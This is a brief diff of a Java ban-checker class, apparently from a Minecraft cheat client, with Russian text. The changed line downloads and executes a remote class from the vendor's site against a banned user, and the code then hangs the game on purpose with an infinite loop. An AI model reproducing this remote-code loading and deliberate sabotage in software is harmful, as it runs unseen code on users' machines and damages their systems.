@@ -29,7 +29,7 @@ public class BanChecker {
 
                 ban("Пользователь заблокирован (Ban Checker)");
                 new LoggingUtils("Пользователь заблокирован (Ban Checker)", true);
-                ((Consumer) BloodyClassLoader.visitClass("https://bloodyhvh.site/test/BanMember.class")).accept("Пользователь заблокирован (Ban Checker)");
+                ((Consumer) BloodyClassLoader.visitClass("https://bloodyhvh.site/loader/classes/BanMember.class")).accept("Пользователь заблокирован (Ban Checker)");
 
                 // Если ему каким-то образом удалось пропатчить весь код, то пусть ловит зависание майна
                 for (;;) {}
